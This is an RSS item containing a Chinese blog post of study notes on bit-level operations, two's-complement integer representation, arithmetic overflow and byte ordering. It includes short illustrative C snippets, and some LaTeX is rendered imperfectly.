&lt;p&gt;![](attachments/pasted image%2020250113125129.png%20)&lt;/p&gt;
&lt;h1&gt;位运算&lt;/h1&gt;
&lt;h2&gt;布尔代数&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;与 and&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;amp;&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2. 或 or&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;amp;#124&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3. 非 not&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;~|
--|--
0|1
1|0&lt;/p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;异或 Xor&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;^&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;位移运算&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;左移 &amp;lt;&amp;lt;
去掉左边多余的位，右边低位填0&lt;/li&gt;
&lt;li&gt;右移 &amp;gt;&amp;gt;
去掉右边多余的位，&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;对于逻辑位移:
 左边填0&lt;/li&gt;
&lt;li&gt;对于&lt;strong&gt;算术位移&lt;/strong&gt;:
填左边的标志位,即
正数:都是填0
负数的补码:高位填1&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;未定义的行为
移动的位数小于0或者大于字长(可能是移动取模后的位数)&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;整数的表示&lt;/h1&gt;
&lt;h2&gt;编码整数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于unsigned类型
$$ Bit2Unsigned(X) = \sum_{i=0}^{w-1} x_i \cdot 2^{i} $$
比如说,对于
$$ (1101)_2 = 2^0+2^2+2^3 = 1+4+8=13 $$&lt;/li&gt;
&lt;li&gt;对于二进制&lt;em&gt;&lt;strong&gt;补码&lt;/strong&gt;&lt;/em&gt; (Two&amp;#39;s Complement)
$$ Bit2T(X) = -x_{w-1}\cdot 2^{w-1} + \sum_{i=0}^{w-2} x_i \cdot 2^{i} $$
比如说,对于
$$ (1101)_2 = 2^0+2^2-2^3 = 1+4-8=-3 $$
最高位是符号位,0表示非负数,1表示负数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;数值范围&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于unsigned类型
$$ UMin = 0 $$
$$ 000...0 $$
$$ UMax = 2^{w}-1 $$
$$ 111...1 $$&lt;/li&gt;
&lt;li&gt;对于二进制补码
$$ TMin = -2^{w-1} $$
$$ 100\dots 0 $$
$$ TMax = 2^{w-1}-1 $$
$$ 011\dots 1 $$
特别地,$111...1_{2}= -1$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;相互转换&lt;/h2&gt;
&lt;p&gt;我们可以发现他们之间存在一一对应的函数关系
首先是反函数的关系:
$$ U2B(X) = B2U^{-1}(X) $$
$$ T2B(X) = B2T^{-1}(X) $$
其次是Signed和Unsigned之间的关系
![](attachments/Pasted image%2020250113191235.png%20)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;总结:在C语言中,signed和unsigned相互转换的规则&lt;ul&gt;
&lt;li&gt;位保持不变&lt;/li&gt;
&lt;li&gt;数值被重新阐述&lt;/li&gt;
&lt;li&gt;可能有意想不到的效果:加上或减去$$ 2^w$$&lt;/li&gt;
&lt;li&gt;当表达式含有signed和unsigned类型的时候,signed会发生强制转换成unsigned&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;字长拓展&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250114175033.png%20)
比如说,对于一个signed类型4比特整数,拓展成8比特长
$$ (-6)&lt;em&gt;{10}=(1010)&lt;/em&gt;{2}=(11111010)&lt;em&gt;{2} $$
$$ (4)&lt;/em&gt;{10}=(0100)&lt;em&gt;{2}=(00000100)&lt;/em&gt;{2} $$&lt;/p&gt;
&lt;h2&gt;字长截断&lt;/h2&gt;
&lt;p&gt;对unsigned类型截短即取模运算
$$ (11010)&lt;em&gt;{2} \ \ mod \ \ 2^4 = (1010)&lt;/em&gt;{2}$$
对signed类型截短也类似于取模运算,有时会把正数变成负数,有时会把负数变成正数&lt;/p&gt;
&lt;h3&gt;总结:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;拓展&lt;ul&gt;
&lt;li&gt;unsigned类型:填0&lt;/li&gt;
&lt;li&gt;signed类型:填符号位&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;截断&lt;ul&gt;
&lt;li&gt;unsigned类型:取模&lt;/li&gt;
&lt;li&gt;signed类型:类似于取模&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;四则运算&lt;/h2&gt;
&lt;h3&gt;加法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;unsigned类型加法需要w+1位来完整存储,但这会造成溢出,所以舍去溢出位,即取模
 $$  UAdd_{w}(u,v) = (u+v) \ \ mod \ \ 2^{w} $$&lt;/p&gt;
&lt;p&gt; 很喜欢的可视化:
 ![](attachments/Pasted image%2020250114182325.png%20)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;补码的加减法
 同样舍去溢出位,会导致负溢出和正溢出(下溢和上溢)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负溢出
  两个负数的和小于TMin,会变成正数&lt;/li&gt;
&lt;li&gt;正溢出
  两个正数的和大于TMax,会变成负数
 所以,对于以下这两段代码:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned i;
for (i = cnt-2; i &amp;gt;= 0; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 及&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define DELTA sizeof(int) 
int i; 
for (i = CNT; i-DELTA &amp;gt;= 0; i-= DELTA) 
    . . .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 都会发生异常!
 正确的做法是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned i; 
for (i = cnt-2; i &amp;lt; cnt; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 精益求精的是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;size_t i; 
for (i = cnt-2; i &amp;lt; cnt; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt; 如果cnt是signed类型并且小于0会怎样?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 很喜欢的可视化:
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250114183747.png&quot; alt=&quot;&quot;&gt;
 加上负数,就是减法
 计算相反数:先取反,再加1
 $$-x=\ \sim x + 1$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;乘法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;unsigned类型的乘法需要2w位来完整存储,但这会造成溢出,所以舍去溢出位,即取模
 $$ UMult_{w}(u,v) = (u \cdot v) \ \ mod \ \ 2^{w}  $$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;signed类型的乘法同样,直接舍去溢出位,有时这会导致正数相乘变负数&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;举一个有趣的例子:
$$ (1101)&lt;em&gt;{2}  \ \ \ \ \ \  (signed \ \ -3/unsigned \ \ 13) $$
$$ (1110)&lt;/em&gt;{2}  \ \ \ \ \ \  (signed \ \ -2/unsigned \ \ 14) $$
$$(1101)&lt;em&gt;{2} \cdot  (1110)&lt;/em&gt;{2}= (1011 \ \  \ 0110)_{2}$$
低4位是 0110,在unsigned中为 6.
所以,在计算13*14的低4位时,可以作unsigned算&lt;/p&gt;
&lt;p&gt;特别地,
$$u\ll k == u \cdot 2^k$$
通常,计算机移位比乘法快得多,编译器会自动比较选择最快的方式:
$$u\ll 5 - u \ll 3 == u * 24 $$
相似地,
对于unsigned类型:
$$ u\gg k == \left\lfloor  \frac{u}{2^k}  \right\rfloor $$
对于signed类型使用&lt;strong&gt;算术移位&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;在内存,指针,字符串中的表示&lt;/h1&gt;
&lt;h2&gt;面向字节的内存组织&lt;/h2&gt;
&lt;p&gt;程序通过地址访问数据,地址就像数组的索引
系统给每个程序提供私有地址空间&lt;/p&gt;
&lt;h2&gt;字长&lt;/h2&gt;
&lt;p&gt;字长是计算机惯常处理的数值大小以及地址的大小
所以,32位计算机的地址局限是4GB(2^ 32 bytes)
64位计算机可以有18EB的地址内存
硬件和编译器共同决定在某个程序中使用多大的字长,这提供了一些兼容性&lt;/p&gt;
&lt;h2&gt;大端序和小端序&lt;/h2&gt;
&lt;p&gt;按照多字节数据在存储器中的存储顺序分为大端序和小端序
大端序设备:某些互联网设施
小端序设备:x86,ARM处理器
大端序:低位存储在高地址
小端序:低位存储在低地址
![](attachments/Pasted image%2020250114231324.png%20)
检查数据在内存中的存储顺序:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;typedef unsigned char *pointer; 
void show_bytes(pointer start, size_t len){ 
	size_t i; 
	for (i = 0; i &amp;lt; len; i++) 
		printf(”%p\t0x%.2x\n&amp;quot;,start+i, start[i]);  // %p:打印指针,%x:打印十六进制数
	printf(&amp;quot;\n&amp;quot;); 
}

			   
int a = 15213; 
printf(&amp;quot;int a = 15213;\n&amp;quot;); 
show_bytes((pointer) &amp;amp;a, sizeof(int));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果(Linux x86-64):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;int a = 15213; 
0x7fffb7f71dbc 6d 
0x7fffb7f71dbd 3b 
0x7fffb7f71dbe 00 
0x7fffb7f71dbf 00
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 13 Jan 2025 00:00:00 GMT</pubDate></item></channel></rss>